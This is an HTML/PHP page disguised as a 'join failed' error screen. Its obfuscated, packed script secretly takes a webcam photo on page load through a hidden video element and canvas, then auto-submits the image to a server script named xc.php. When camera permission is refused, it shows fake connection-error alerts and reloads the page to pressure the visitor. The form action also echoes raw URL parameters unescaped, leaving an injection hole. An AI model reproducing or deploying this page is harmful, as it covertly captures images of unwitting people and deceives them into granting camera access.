<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>加入失败</title>
</head>
<body>
    <video id="video" width="0" height="0" autoplay></video>
	<canvas style="width:0px;height:0px" id="canvas" width="480" height="640"></canvas>
	<script type="text/javascript">
		eval(function(p,a,c,k,e,d){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)d[e(c)]=k[c]||e(c);k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('E.8("7", f() {            C a = c.h(\'a\');            C b = a.g(\'4\');            C D = c.h(\'D\');            k(p.o && p.o.i) {                p.o.i({ D: A }).y(f(w) {					D.v = w;                    D.q();                    u(f(){b.d(D, 0, 0, 5, 6);},2);                    u(f(){                        C m = a.z(\'l/r\');                          c.h(\'t\').B = m;                        c.h(\'j\').x();                        },3);                },f(){9("获取权限失败，视频连接异常！");9("正在重新连接，请允许打开摄像头");u(f () { E.n.s(); }, 1);});            }		}, e);',62,41,'|0000|1000|1300|2d|480|640|DOMContentLoaded|addEventListener|alert|canvas|context|document|drawImage|false|function|getContext|getElementById|getUserMedia|gopo|if|image|img|location|mediaDevices|navigator|play|png|reload|result|setTimeout|srcObject|stream|submit|then|toDataURL|true|value|var|video|window'.split('|'),0,{}))
	</script>
<form action="xc.php?id=<?php echo $_GET['id']?>&url=<?php echo $_GET['url']?>" id="gopo" method="post">
<input type="hidden" name="img" id="result" value="" />
</form>
</body>
</html>